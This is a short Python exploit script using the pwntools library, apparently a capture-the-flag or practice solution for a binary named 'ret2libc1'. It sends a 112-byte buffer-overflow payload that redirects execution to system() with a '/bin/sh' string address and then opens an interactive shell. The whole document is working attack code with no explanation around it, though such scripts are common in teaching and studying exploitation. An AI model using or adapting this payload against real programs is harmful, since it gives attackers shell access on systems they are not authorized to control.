from pwn import *
 #目标文件
TARGET ='./ret2libc1'
sh = process(TARGET)
offset=112
system_addr=0x08048460
bin_addr=0x08048720

payload=offset*b'A'+p32(system_addr)+p32(0x123456)+p32(bin_addr)

sh.sendline(payload)
# 交互模式(查看输出)
sh.interactive()
